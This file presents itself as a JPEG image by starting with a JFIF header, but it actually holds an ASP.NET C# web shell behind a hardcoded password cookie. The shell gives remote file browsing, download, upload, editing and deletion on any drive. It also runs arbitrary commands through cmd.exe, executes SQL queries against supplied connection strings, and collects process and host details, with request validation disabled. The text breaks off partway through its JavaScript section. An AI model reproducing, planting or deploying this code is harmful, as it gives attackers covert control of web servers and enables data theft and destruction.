ÿØÿà JFIF      ÿÛ „ 
			


























<%@ Page Language="C#"   trace="false" EnableViewStateMac="false"  validateRequest="false"  enableEventValidation="false" %>
<%@ import Namespace="System.Collections.Generic"%>
<%@ import Namespace="System.Web.Services"%>
<%@ import Namespace="System.Web"%>
<%@ import Namespace="System.IO"%>
<%@ import Namespace="System"%>
<%@ import Namespace="System.Net" %>
<%@ import Namespace="System.Diagnostics"%>
<%@ Import Namespace="System.Data.SqlClient"%>
<%@ import Namespace="Microsoft.Win32"%>
<%@ import Namespace="System.Management"%>
<%@ Assembly Name="System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<!DOCTYPE html>
<style type="text/css">
body {
 background: #f0f0f0;
 margin: 0;
 padding: 0;
 font: 12px normal Verdana, Arial, Helvetica, sans-serif;
 color: #444;
    width:1000px;
}
h1 {font-size: 3em; margin: 20px 0;}
.container {width: 90%; margin: 10px auto;}
ul.tabs {
 margin: 0;
 padding: 0;
 float: left;
 list-style: none;
 height: 32px;
 border-bottom: 1px solid #999;
 border-left: 1px solid #999;
 width: 100%;
}
ul.tabs li {
 float: left;
 margin: 0;
 padding: 0;
 height: 31px;
 line-height: 31px;
 border: 1px solid #999;
 border-left: none;
 margin-bottom: -1px;
 background: #e0e0e0;
 overflow: hidden;
 position: relative;
}
ul.tabs li a {
 text-decoration: none;
 color: #000;
 display: block;
 font-size: 1.2em;
 padding: 0 20px;
 border: 1px solid #fff;
 outline: none;
}
ul.tabs li a:hover {
 background: #ccc;
} 
html ul.tabs li.active, html ul.tabs li.active a:hover  {
 background: #fff;
 border-bottom: 1px solid #fff;
}
.tab_container {
 border: 1px solid #999;
 border-top: none;
 clear: both;
 float: left;
 width: 100%;
 background: #fff;
 -moz-border-radius-bottomright: 5px;
 -khtml-border-radius-bottomright: 5px;
 -webkit-border-bottom-right-radius: 5px;
 -moz-border-radius-bottomleft: 5px;
 -khtml-border-radius-bottomleft: 5px;
 -webkit-border-bottom-left-radius: 5px;
}
.tab_content {
 padding: 20px;
 font-size: 1.2em;
}
.tab_content h2 {
 font-weight: normal;
 padding-bottom: 10px;
 border-bottom: 1px dashed #ddd;
 font-size: 1.8em;
}
.tab_content h3 a{
 color: #254588;
}
.tab_content img {
 float: left;
 margin: 0 20px 20px 0;
 border: 1px solid #ddd;
 padding: 5px;
}
</style>
<style type="text/css">
    iframe.hidden
{
display:none
}
        td
        {
            padding: 2px;
            background: #e8edff;
            border-top: 1px solid #fff;
            color: #669;
           
        }
         tr:hover td{
                background-color:#7DFDFE;
               
               
             
                }
     th
    {
        padding: 2px;
        color: #039;
        background: #b9c9fe;
    }
               
                   
    table
    {
        height: 100%;
        width: 100%;
    }
    #content
    {
        z-index: 1;
        left: 20px;
        top: 39px;
        position: absolute;
        height: 155px;
        width: 1214px;
    }
    #upload
    {
        width: 527px;
        height: 52px;
        background-color: #CCCCCC;
    }
    #TextArea1
    {
        height: 278px;
        width: 380px;
    }
    .buttons
    {
        height:30px;
        cursor:pointer;
    }
    </style>



<script runat="server">
/// <problems>
/// - javascript registered code
/// - driver dropdownlist problem
/// </problem>
///

    /// <TO DO>
    /// - create new file ,dir.
    /// - copy /cut file ,dir
    /// </TO DO>
    ///

     public static string curr = "osker";
     string connstr;
     string password="aadil.xxx";
     public class data
     {
         public data(string n, string s, string fp, string lm)
         {
             Name = n; Size = s; FullPath = fp;lastmodfiy=lm;
         }
         public string Name;
         public string FullPath;
         public string Size;
         public string lastmodfiy;
     }
     public static void RegisterJavaScript(System.Web.UI.Page page)
     {
       
               page.ClientScript.RegisterHiddenField("__EVENTTARGET","");
                page.ClientScript.RegisterHiddenField("__ARGS","");
                string s=@"<script language=Javascript>";
                s+=@"function Bin_PostBack(eventTarget,eventArgument)";
                s+=@"{";
                s+=@"var theform=document.forms[0];";
                s+=@"theform.__EVENTTARGET.value=eventTarget;";
                s+=@"theform.__ARGS.value=eventArgument;";
                s+=@"theform.submit();";
                s+=@"} ";
                s+=@"</scr"+"ipt>";
                page.RegisterStartupScript("asd",s);
       
                }
   
   
               
    protected void Page_Load(object sender, EventArgs e)
    {
        Page.Title = " ";
        RegisterJavaScript(this);
        hide_allpanel();
        if (DriversList.Items.Count == 0)
        {
            DriveInfo[] drives = DriveInfo.GetDrives();
            DriversList.Items.Clear();
            DriversList.Items.Add("Select Drive");
            foreach (DriveInfo dinfo in drives)
            {

                DriversList.Items.Add(new ListItem(dinfo.Name + "  " + dinfo.DriveType, dinfo.Name));  //);
            }
        }
        //////////////////////////
     
        ////////////////////////////////
        if (check_auth())
        {
         
            this.Menue.Visible = true;
            Logout.Visible = true;
         
           
        }
        else
        {
           return;
         
        }
        msgs.Text = "";       
       
       if (Request.QueryString["Name"] != null || Request.QueryString["Name"] != "")
       {
           string temp = Request.QueryString["Name"];
           if(temp != null)
           download(base64Decode(temp));
     
       }
     
       
        if (!IsPostBack)
        {
           
           
       
             GetFiles_Dirs(".", true);
        //   string[] drivers = Directory.GetLogicalDrives();
           
         
   
        /////////////////
         
           
       }
        if (IsPostBack)
        {
         
            string evarg = Request["__EVENTTARGET"];
            string args = Request["__ARGS"];
           
          //  Page.Title = evarg;
            if (evarg != "")
            {
                switch (evarg)
                {
                   
                    case "down":
                        download(base64Decode(args));
                        break;
                    case "GetFiles_Dirs":
                        GetFiles_Dirs(base64Decode(args), false);
                        break;
                    case "shell_root":
                        GetFiles_Dirs(base64Decode(args), true);
                        break;
                    case "del":
                        delete_file(base64Decode(args));
                       break;
                    case "del2":
                       delete_folder(base64Decode(args));
                       break;
                    case "delall":
                       deleteall(args);
                       break;
                    case "ren":
                       rename_file(args);
                        break;
                    case "ren2":
                        rename_folder(args);
                        break;
                    case "edit":
                        editing(base64Decode(args));
                        break;

                    case "newdir":
                        create_new_dir((args));
                        break;
                    case "newfile":
                        create_new_file((args));
                        break;
                 
                }

             
            }
        }
       
        //if(IsPostBack)
     
           
    }
    public bool check_auth()
    {
        if (Request.Cookies["Login_Cookie"] == null)
        {
            return false;
        }
        else
        {
            if (Request.Cookies["Login_Cookie"].Value != password)
            {
                return false;
            }
            else
            {
               
                return true;
            }
        }
    }
    public void hide_allpanel()
    {
        this.Login.Visible = true;
        object[] divs = { this.FileManger, this.CMD, this.DBS ,this.editpanel,this.UserInfo,this.Processes_Services,this.CopyFiles};
        foreach (object s in divs)
        {
            Panel p2 = new Panel();
            p2 = (Panel)s;
            p2.Visible = false;
        }
    }

    void process()
    {
        Table tbl = new Table();

        //   tbl.Style = @"width:100%";
        tbl.Width = 870;
        this.Processes_Services.Controls.Add(tbl);
        int tblRows = 10;
        int tblCols = 3;
        TableHeaderRow header_tr = new TableHeaderRow();
        TableHeaderCell proc_id = new TableHeaderCell();
        TableHeaderCell proc_user = new TableHeaderCell();
        TableHeaderCell proc_name = new TableHeaderCell();
        proc_id.Text = "ID";
       proc_name.Text = "Process Name";
       proc_user.Text = "User";
        header_tr.Cells.Add(proc_id);
        header_tr.Cells.Add(proc_name);
         header_tr.Cells.Add(proc_user);
        tbl.Rows.Add(header_tr);
        Process[] p = Process.GetProcesses();
        foreach (Process sp in p)
        {
            TableRow data_tr = new TableRow();
            TableCell proc_id_tc = new TableCell();
             proc_id_tc.Text = sp.Id.ToString();
            TableCell proc_name_tc = new TableCell();
            proc_name_tc.Text =  sp.ProcessName;
            TableCell proc_user_tc = new TableCell();
         //   proc_user_tc.Text =  GetProcessOwner(sp.Id.ToString());// GetUserName(sp.Id);//
            data_tr.Cells.Add(proc_id_tc);
            data_tr.Cells.Add(proc_name_tc);
            data_tr.Cells.Add(proc_user_tc);
            tbl.Rows.Add(data_tr);

        }
        message(true, "list process");
    }

    string get_user_process(int i)
    {
        using (ManagementObject proc = new 
           
            ManagementObject("Win32_Process.Handle='" + i.ToString() + "'"))
        {

         //   proc.Get();
            string[] s = new String[2];
            //Invoke the method and populate the array with the user name and domain

            proc.InvokeMethod("GetOwner", (object[])s);

            return s[1] + "\\" + s[0];
        }


    }
    private string GetUserName(int procName)
    {
        string[] ownerInfo = new string[2];
        foreach (ManagementObject p in PhQTd("Select * from Win32_Process Where ProcessID ='" + procName + "'"))
        {
            p.InvokeMethod("GetOwner", (object[])ownerInfo);
        }
        return ownerInfo[0];
       
       
    }

    public string GetProcessOwner(string processName)
    {
        string query = "Select * from Win32_Process Where ProcessID = \"" + processName + "\"";
        ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
        ManagementObjectCollection processList = searcher.Get();

        foreach (ManagementObject obj in processList)
        {
            string[] argList = new string[] { string.Empty, string.Empty };
            int returnVal = Convert.ToInt32(obj.InvokeMethod("GetOwner", argList));
            if (returnVal == 0)
            {
                // return DOMAIN\user
                string owner = argList[1] + "\\" + argList[0];
                return owner;
            }
        }

        return "NO OWNER";
    }
   
   
        public ManagementObjectCollection PhQTd(string query)
{
ManagementObjectSearcher QS=new ManagementObjectSearcher(new SelectQuery(query));
return QS.Get();
}
    void u_info()
    {
        Table tbl = new Table();
       
     //   tbl.Style = @"width:100%";
        tbl.Width = 870;
        this.UserInfo.Controls.Add(tbl);
        Add_Table_Row(tbl, "Server IP", Request.ServerVariables["LOCAL_ADDR"]);
        Add_Table_Row(tbl, "Host Name", Dns.GetHostName() );//Environment.MachineName);
        Add_Table_Row(tbl, "IIS Version", Request.ServerVariables["SERVER_SOFTWARE"]);
        Add_Table_Row(tbl, "IIS APPPOOL Identity", Environment.UserName);
        Add_Table_Row(tbl, "OS Version", Environment.OSVersion.ToString());
        Add_Table_Row(tbl, "System Time", DateTime.Now.ToString());
     
       
       
        message(true, "");
    }

    void Add_Table_Row(Table tbl, string s1, string s2)
    {
        TableRow data_tr = new TableRow();
        TableCell cell1 = new TableCell();
        cell1.Text = s1;
        TableCell cell2 = new TableCell();
        cell2.Text = s2;
        data_tr.Cells.Add(cell1);
        data_tr.Cells.Add(cell2);
        tbl.Rows.Add(data_tr);
    }
    // ////////////////////////////////////////////
    public void process_design(object sender, EventArgs e)
    {
        Button b = sender as Button;
      //  b.BackColor = System.Drawing.Color.Red;
        //LinkButton b = sender as LinkButton;
        show_panel(b.Text);
        if (b.Text == "Processes_Services")
            process();
        if (b.Text == "UserInfo")
            u_info();
       
    }
    // /////////////////////////////////////
    public void fm(object sender, EventArgs e)
    {
        this.FileManger.Visible = true;
        GetFiles_Dirs(".", true);
    }

    public void show_panel(string ctrl)
    {
        this.Login.Visible = false;
        object[] divs = { this.FileManger, this.CMD, this.DBS,this.editpanel ,this.UserInfo, this.Processes_Services,this.CopyFiles};
        foreach (object s in divs)
        {
            Panel p2 = new Panel();
            p2 = (Panel)s;
            if (p2.ID==ctrl)
                p2.Visible = true;
          //  if(p2.ID=="FileManger")
             //   GetFiles_Dirs(".", true);
        }
    }
   
 
 


    public string base64Encode(string data)
    {
        try
        {
            byte[] encData_byte = new byte[data.Length];
            encData_byte = System.Text.Encoding.UTF8.GetBytes(data);
            string encodedData = Convert.ToBase64String(encData_byte);
            return encodedData;
        }
        catch (Exception e)
        {
            throw new Exception("Error in base64Encode" + e.Message);
        }
    }

    public string base64Decode(string data)
    {
        try
        {
            System.Text.UTF8Encoding encoder = new System.Text.UTF8Encoding();
            System.Text.Decoder utf8Decode = encoder.GetDecoder();

            byte[] todecode_byte = Convert.FromBase64String(data);
            int charCount = utf8Decode.GetCharCount(todecode_byte, 0, todecode_byte.Length);
            char[] decoded_char = new char[charCount];
            utf8Decode.GetChars(todecode_byte, 0, todecode_byte.Length, decoded_char, 0);
            string result = new String(decoded_char);
            return result;
        }
        catch (Exception e)
        {
            throw new Exception("Error in base64Decode" + e.Message);
        }
    }
   
    public void message(bool status, string msg)
    {
        if (status == true)
        {
            msgs.ForeColor = System.Drawing.Color.Green;
            msgs.Text = "Sucess, " + msg;
        }
        else
        {
            msgs.ForeColor = System.Drawing.Color.Red;
            msgs.Text = "Error, " + msg;
        }
    }

    string count_files_dirs(string p)
    {
        int fc = 0; int dc = 0;
        string[] files = Directory.GetFiles(p);
        string[] dirs = Directory.GetDirectories(p);
        foreach (string f in files)
        {
            fc += 1;
        }
        foreach (string f in dirs)
        {
            dc += 1;
        }
        return dc+" dirs, "+fc+" files";
    }
    public  void GetFiles_Dirs(string path ,bool isvirtual)
    {
        try
        {

            show_panel(this.FileManger.ID);
            editpanel.Visible = false;
            curr = path;

            ArrayList arraydata = new ArrayList();

            string currentpath = "";
            if (isvirtual)
            {
                currentpath = HttpContext.Current.Server.MapPath(path);
            }
            else
                currentpath = path;
            currentpathlabel.Text = currentpath;
            Hidden1.Value = currentpath;


            string[] files = Directory.GetFiles(currentpath);
            string[] dirs = Directory.GetDirectories(currentpath);
            string previospath = "";
            string[] ppath = currentpath.Split('\\');
            for (int n = 1; n <= ppath.Length - 1; n++)
            {

                if (ppath.Length - 1 == 1)
                {
                    previospath += ppath[n - 1] + "\\";


                }
                else if (n == ppath.Length - 1)
                {
                    previospath += ppath[n - 1];


                }
                else
                {
                    previospath += ppath[n - 1] + "\\";

                }


            }
            string prevtemp = "";
            //  Literal1.Text = previospath;
            for (int n = 0; n < ppath.Length; n++)
            {

                if (n == 0)
                {

                    //<%=  base64Encode(ppath[n] + "\\")%>
                    string dec = base64Encode(ppath[n] + "\\");
                    Literal1.Text = "<a href=\"javascript:Bin_PostBack('GetFiles_Dirs','" + dec + "')\">" + ppath[n] + "\\" + "</a>";
                    prevtemp = ppath[n];

                }
                else
                {
                    string dec1 = base64Encode(prevtemp + "\\" + ppath[n]);

                    Literal1.Text += "<a href=\"javascript:Bin_PostBack('GetFiles_Dirs','" + dec1 + "')\">" + ppath[n] + "\\" + "</a>";
                    prevtemp = prevtemp + "\\" + ppath[n];

                }



            }
           arraydata.Add(new data("..  " , "Parent Folder", previospath, currentpath));
         
           
            //  object o = new object { Name = "..", Size = "..", FullPath = previospath.Replace(@"\", @"\\"), DataSource = currentpath };
            //fileslist.Add(new { Name = "..", Size = "..", FullPath = previospath.Replace(@"\", @"\\"), DataSource = currentpath });
             int dirs_count = 0;
            int files_count = 0;

            foreach (string d in dirs)
            {
                DirectoryInfo dinfo = new DirectoryInfo(d);
                HyperLink g = new HyperLink();
                g.Text = dinfo.Name;
                //  fileslist.Add(new { Name = dinfo.Name, Size = "Folder", FullPath = dinfo.FullName.Replace(@"\", @"\\"), DataSource = currentpath });
                arraydata.Add(new data(dinfo.Name, "Folder", dinfo.FullName, dinfo.LastWriteTime.ToString("d/MM/yyyy - hh:mm:ss tt")));
                dirs_count+=1;

            }
            foreach (string f in files)
            {
                FileInfo finfo = new FileInfo(f);


                arraydata.Add(new data(finfo.Name, finfo.Length.ToString(), finfo.FullName.Replace(@"\", @"\\"), finfo.LastWriteTime.ToString("d/MM/yyyy  - hh:mm:ss tt")));
                files_count += 1;
            }
           
         
           
            foreach (object o in arraydata)
            {
                data d = (data)o;

                HtmlTableRow r = new HtmlTableRow();
                HtmlTableCell cname = new HtmlTableCell();
                HtmlTableCell csize = new HtmlTableCell();
                HtmlTableCell lastmodify = new HtmlTableCell();
                HtmlTableCell ctodo = new HtmlTableCell();
                if (d.Size == "Parent Folder")

                    cname.InnerHtml = "<a href=\"javascript:Bin_PostBack('GetFiles_Dirs','" + base64Encode(d.FullPath) + "')\">" + d.Name + "</a>" + "&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp " + files_count + "&nbspFiles ," + dirs_count + "&nbspFolders";

                else if (d.Size == "Folder")
                {
                    cname.InnerHtml = "<a href=\"javascript:Bin_PostBack('GetFiles_Dirs','" + base64Encode(d.FullPath) + "')\">" + d.Name + "</a>";
                    csize.InnerHtml = "--";
                    lastmodify.InnerHtml = d.lastmodfiy;
                    ctodo.InnerHtml ="<a href=\"#\" onclick=\"javascript:rename2('" + d.Name + "')\">Rename</a>" + " || " +
                   "<a href=\"#\" onclick=\"javascript:if(confirm('Are you sure delete folder " + d.Name+ " it may be non-empty ,all files & dirs will be deleted ?')){Bin_PostBack('del2','" + base64Encode(d.FullPath) + "')}\">Del</a>";
                }
                else
                {
                    //"<a href=\"javascript:Bin_PostBack('Bin_Listdir','"+MVVJ(objfile.DirectoryName)+"')\">"+objfile.FullName+"</a>";
                    cname.InnerHtml = "<input id=\"Checkbox1\" name=\"" + base64Encode(d.FullPath) + "\" type=\"checkbox\" />" + d.Name;
                    csize.InnerHtml = convert_bytes(Convert.ToInt64(d.Size));
                    lastmodify.InnerHtml = d.lastmodfiy;
                    ctodo.InnerHtml = "<a href= \"#\" onclick=\"javascript:Bin_PostBack('down','" + base64Encode(d.FullPath) + "')\">Down</a>" + " || " +
                        "<a href=\"#\" onclick=\"javascript:Bin_PostBack('edit','" + base64Encode(d.FullPath) + "')\">Edit</a>" + " || " +
                        "<a href=\"#\" onclick=\"javascript:rename('" + d.Name + "')\">Rename</a>" + "|" +
                        "<a href=\"#\" onclick=\"javascript:Bin_PostBack('copymove','" + base64Encode(d.FullPath) + "')\">Copy/Move</a>" + " || " +
                    "<a href=\"#\" onclick=\"javascript:if(confirm('Are you sure delete the file  "+ d.Name+"  ?')){Bin_PostBack('del','" + base64Encode(d.FullPath) + "')}\">Del</a>";
                }
                r.Cells.Add(cname);
                r.Cells.Add(csize);
                r.Cells.Add(lastmodify);
                r.Cells.Add(ctodo);
                tblEmployee.Rows.Add(r);


            }
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }
    }

    string convert_bytes(Int64 bytes)
    {
       
        if ((bytes / 1024) < 1)
            return bytes + " B";
       
        else if ((bytes / (1024 * 1024)) < 1)
           return string.Format("{0:####0.0} KB",(double) bytes / 1024 );
           
        else if ((bytes / (1024 * 1024 * 1024)) < 1)
           return string.Format("{0:####0.0} MB", (double)bytes / (1024 * 1024));
                     
        else
            return string.Format("{0:####0.0} GB", (double) bytes / (1024 * 1024 * 1024));

   
   
    }
    // //////////////////////////////

    void create_new_dir(string dir)
    {
        try
        {
            string path = currentpathlabel.Text + "\\";
            Directory.CreateDirectory(path + dir);
            message(true, "Folder:" + " '" + dir + "' " + "Created");
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }
       
        GetFiles_Dirs(currentpathlabel.Text, false);
    }

    void create_new_file(string file)
    {
        try
        {
            string path = currentpathlabel.Text + "\\";
            if (File.Exists(path + file))
            {
                message(false, "File" + " '" + file + "' " + "exist,you can edit it");
                GetFiles_Dirs(currentpathlabel.Text, false);
            }
            else
            {

                StreamWriter sr = new StreamWriter(path + file, false);
                sr.Close();
                message(true, "New File" + " '" + file + "' " + "Created");
                editing(path + file);
            }
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }

       // GetFiles_Dirs(currentpathlabel.Text, false);
    }
    // //////// Edit File//////////////////
    public void editing(string file)
    {
        try
        {
            show_panel("editpanel");


            filetoedit.Text = file;
            if (File.Exists(file))
            {
                StreamReader sr;

                sr = new StreamReader(file);

                editfile.Text = sr.ReadToEnd();
                sr.Close();
            }
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }

    }
    protected void Save_Click(object sender, EventArgs e)
    {
        try
        {

            StreamWriter sw;
            string file = filetoedit.Text;
            sw = new StreamWriter(file, false);

            sw.Write(editfile.Text);
            sw.Close();
            message(true, "File:" + " '" + file + "' " + "Saved");


        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }
        GetFiles_Dirs(currentpathlabel.Text, false);
    }
    // /////////////////////////////////
   
    // ///////////upload///////////////////
    protected void Upload_Click(object sender, EventArgs e)
    {
        try
            {

        if (FileUpload1.HasFile)
             {
           
                string filename = Path.GetFileName(FileUpload1.FileName);
                FileUpload1.SaveAs(currentpathlabel.Text + "\\" + filename);
                message(true, "File: '" + currentpathlabel.Text + "\\" + filename + "'Uploaded");
             
             }
        }
            catch (Exception ex)
            {
                message(false, ex.Message);
            }
          GetFiles_Dirs(currentpathlabel.Text, false);
    }
    // ////////////////////////////////////////////
   
    // /////////////download file(s)/////////////////
    public void download(string path)
    {
        try
        {
            FileInfo fs = new FileInfo(path);
            Response.Clear();
            Page.Response.ClearHeaders();
            Page.Response.Buffer = false;
            this.EnableViewState = false;
           // Response.AddHeader("Content-Disposition", "attachment;filename=" + HttpUtility.UrlEncode(fs.Name, System.Text.Encoding.UTF8));
            Response.AddHeader("Content-Disposition", "attachment;filename=" + fs.Name);
            Response.AddHeader("Content-Length", fs.Length.ToString());
            Page.Response.ContentType = "application/unknown";
            Response.WriteFile(fs.FullName);
            Page.Response.Flush();
            Page.Response.Close();
            Response.End();
            Page.Response.Clear();         
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }
           
    }

    // ////////////////////////////////////////////

    // /////////////rename file(s)/////////////////
    public void rename_file(string paths)
    {
        try
        {
            string[] files = paths.Split(',');

            File.Move(currentpathlabel.Text + "\\" + files[0], currentpathlabel.Text + "\\" + files[1]);
            message(true, "File Renamed");
       
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        } 
        GetFiles_Dirs(currentpathlabel.Text, false);
    }
     /////////////////////////////////////////////

    public void rename_folder(string paths)
    {
        try
        {
            string[] files = paths.Split(',');
           
           Directory.Move(currentpathlabel.Text + "\\" + files[0], currentpathlabel.Text + "\\" + files[1]);
            message(true, "Folder Renamed");

        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }
        GetFiles_Dirs(currentpathlabel.Text, false);
    }
    // ////////////////////////////
   
    // /////////////delete files/////////////////
    public void deleteall(string paths)
    {
        try
        {
            string[] files = paths.Split(',');
            for (int i = 0; i < files.Length - 1; i++)
            {

                File.Delete(base64Decode(files[i]));
            }
            message(true, "Files Delted");
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }
     


       
        GetFiles_Dirs(currentpathlabel.Text, false);
    }

    // ////////////////////////////////////////////

    // /////////////delete file/////////////////
    public void delete_file(string path)
    {
        try
        {
            FileInfo fs = new FileInfo(path);


            fs.Delete();
            message(true, "File Deleted");
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }
        GetFiles_Dirs(currentpathlabel.Text, false);
    }
        //////////////////////////////////////
       
        public void delete_folder(string path)
    {
        try
        {
            DirectoryInfo  fs = new DirectoryInfo(path);


            fs.Delete(true);
            message(true, "Folder Deleted");
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }
       
        GetFiles_Dirs(currentpathlabel.Text, false);
    }



    // ////////////////////////////////////////////

    // /////////////dos commands/////////////////
    protected void CmdSubmit_Click(object sender, EventArgs e)
    {
        show_panel(this.CMD.ID);
        CmdResult.Text = command(Command.Text);
    }
 
    public static string command(string cmd)
    {
      //  string argument = string.Format(@" -S {0} -U {1} -P {2} ", "LOSMAN-PC", "test", "asd");
        string argument = string.Format(@" -S {0} ", "LOSMAN-PC");
      //  System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo("sqlcmd.exe",argument);
      System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo("cmd.exe");
        psi.CreateNoWindow = true;
        psi.UseShellExecute = false;
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardInput = true;
        psi.RedirectStandardError = true;
        psi.WorkingDirectory = HttpContext.Current.Server.MapPath(".");
        // Start the process
        System.Diagnostics.Process proc = System.Diagnostics.Process.Start(psi);

        // Attach the output for reading
        System.IO.StreamReader sOut = proc.StandardOutput;
        System.IO.StreamReader sOut2 = proc.StandardError;
        //  sOut = proc.StandardError;
        // Attach the in for writing
        System.IO.StreamWriter sIn = proc.StandardInput;
        string commands = cmd;
        string[] delimiter = { Environment.NewLine };

        string[] b = commands.Split(delimiter, StringSplitOptions.None);
        foreach (string s in b)
        {
            sIn.WriteLine(s);
        }
        // string stEchoFmt = "# {0} run successfully. Exiting";


        //  sIn.WriteLine(String.Format(stEchoFmt, ""));
        // Write each line of the batch file to standard input
        sIn.WriteLine("Exit");
        // Close the process
        proc.Close();
        // Read the sOut to a string.
        string results = sOut.ReadToEnd().Trim();
      string resultserror =sOut2.ReadToEnd().Trim();
        // Close the io Streams;
        sIn.Close();
        sOut.Close();

        return results + resultserror;

    }

    // ////////////////////////////////////////////

    // /////////////get drive files & dirs/////////////////
    protected void slctdrive_Click(object sender, EventArgs e)
    {
        try
        {

           if (DriversList.SelectedValue == "Select Drive")
               GetFiles_Dirs(currentpathlabel.Text, false);
         
               GetFiles_Dirs(DriversList.SelectedValue, false);
        //}
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }

    }
    private void getdatabases(int ind)
    {

        try
        {
            DropDownList1.Items.Clear();

            SqlConnection myconn;
            SqlCommand mycomm;

            myconn = new SqlConnection(connections.Text);
            myconn.Open();
            string command = "SELECT name FROM sys.sysdatabases where name NOT IN ('master', 'tempdb', 'model', 'msdb') order by name; ";

            mycomm = new SqlCommand(command, myconn);
            SqlDataReader dr = mycomm.ExecuteReader();
            while (dr.Read())
            {
                DropDownList1.Items.Add(dr[0].ToString());
            }
            myconn.Close();

            DropDownList1.SelectedIndex = ind;

        }
        catch (Exception ex)
        {
            msgs.Text = ex.Message;
        }
    }
    // ///////////////////////////
    private void gettables(int ind)
    {
        try
        {
            DropDownList2.Items.Clear();

            SqlConnection myconn;
            SqlCommand mycomm;

            myconn = new SqlConnection(connections.Text);
            myconn.Open();
            string command = "SELECT * FROM sys.tables order by name; ";

            mycomm = new SqlCommand(command, myconn);
            SqlDataReader dr = mycomm.ExecuteReader();
            while (dr.Read())
            {

                DropDownList2.Items.Add(dr[0].ToString());
            }

            DropDownList2.SelectedIndex = ind;
            myconn.Close();
        }
        catch (Exception ex)
        {
            msgs.Text = ex.Message;
        }
    }


    // //////////////////////////////////////////////////////////////////
    public ArrayList getcolums()
    {
          SqlConnection myconn;
            SqlCommand mycomm;
            ArrayList arrcolumns = new ArrayList();
            myconn = new SqlConnection(connections.Text);
            myconn.Open();
            string command = "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Bugs'; ";

            mycomm = new SqlCommand(command, myconn);
            SqlDataReader dr = mycomm.ExecuteReader();
            Table tbl = new Table();
           this.DBS.Controls.Add(tbl);
           while (dr.Read())
           {
               arrcolumns.Add(dr[0].ToString());
           }
           return arrcolumns;
    }
     private void CreateDynamicTable(string query)
    {
        try
        {
            // ArrayList arrcolumns = getcolums();
            SqlConnection myconn;
            SqlCommand mycomm;

            myconn = new SqlConnection(connections.Text);
            myconn.Open();
            string command = query;

            mycomm = new SqlCommand(command, myconn);
            SqlDataReader dr = mycomm.ExecuteReader();
            Table tbl = new Table();
            tbl.Width = 100;
            this.DBS.Controls.Add(tbl);
            int tblRows = 10;
            int tblCols = dr.FieldCount; ;
            TableRow tr2 = new TableRow();

            for (int j = 0; j < dr.FieldCount; j++)
            {
                TableHeaderCell tc = new TableHeaderCell();
                TextBox txtBox = new TextBox();


                // Add the control to the TableCell
                tc.Text = dr.GetName(j).ToString();
                // Add the TableCell to the TableRow
                tr2.Cells.Add(tc);
            }
            tbl.Rows.Add(tr2);
            int c = 0;
            while (dr.Read())
            {
               

                TableRow tr = new TableRow();
                for (int j = 0; j < tblCols; j++)
                {
                    TableCell tc = new TableCell();
                    TextBox txtBox = new TextBox();

                    // Add the control to the TableCell
                    tc.Text = dr[j].ToString();
                    // Add the TableCell to the TableRow
                    tr.Cells.Add(tc);
                }
                // Add the TableRow to the Table
                tbl.Rows.Add(tr);
                c=c+1;
             
            }
            message(true, c.ToString() + " rows selected");
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }

       // This parameter helps determine in the LoadViewState event,
       // whether to recreate the dynamic controls or not

     
    }
    // ////////////////////////////
    protected void gdb_Click(object sender, EventArgs e)
    {
        show_panel(this.DBS.ID);
        connstr = connections.Text;
        getdatabases(0);
    }


    protected void Button1_Click(object sender, EventArgs e)
    {
        show_panel(this.DBS.ID);
        gettables(0);
       // CreateDynamicTable();
    }
    // //////////////////////////////////////////////////////////////////

    protected void executequery_Click(object sender, EventArgs e)
    {
        show_panel(this.DBS.ID);
        CreateDynamicTable(sqlquery.Text);
    }

    protected void Login_Button_Click(object sender, EventArgs e)
    {
        string pass = Login_TextBox.Text;
        if (pass == password)
        {
            Response.Cookies.Add(new HttpCookie("Login_Cookie", pass));
          //  show_panel(this.FileManger.ID);
             GetFiles_Dirs(".", true);
             this.Menue.Visible = true;
             Logout.Visible = true;
         }
        else
        {
       
        }
    }

    protected void Logout_Click(object sender, EventArgs e)
    {
        hide_allpanel();
        this.Menue.Visible = false;
        //this.Login.Visible = true;
        Session.Abandon();
        Response.Cookies.Add(new HttpCookie("Login_Cookie", null));
        Logout.Visible = false;
    }

    protected void Button_process_Click(object sender, EventArgs e)
    {
        show_panel(this.Processes_Services.ID);
        process();
    }

    protected void Button_services_Click(object sender, EventArgs e)
    {
        show_panel(this.Processes_Services.ID);
        process();
    }

    protected void DriversList_SelectedIndexChanged(object sender, EventArgs e)
    {
     //  DriversList.SelectedIndex =DriversList.Items[DriversList.SelectedIndex].;
        Page.Title = DriversList.SelectedValue;
    }
    public void CopyShell(String Source, String Dest)
    {
        System.IO.File.Copy(Source, Dest, true);
    }
    public void CopyFile(object sender, EventArgs e)
    {
        show_panel(this.CopyFiles.ID);
        try
        {
            CopyShell(this.TextBox1.Text, this.TextBox2.Text);
            Label3.Text = "Success............";
        }
        catch (Exception ex)
        {
            Label3.Text = ex.Message;
        }
    }
</script>

<script type="text/javascript">

    function rename(file) {
        var f = prompt("rename file:", file);
        var renfile = file;
        if (f != null) {
            renfile += "," + f
            Bin_PostBack('ren', renfile);

        }

    }


    function rename2(folder) {
        var f = prompt("rename file:", folder);
        var renfile = folder;
        if (f != null) {
            renfile += "," + f
            Bin_PostBack('ren2', renfile);

        }

    }

    function newfolder() {
        var folder = prompt("Create New Folder", "");
     
        if (folder != null) {
         
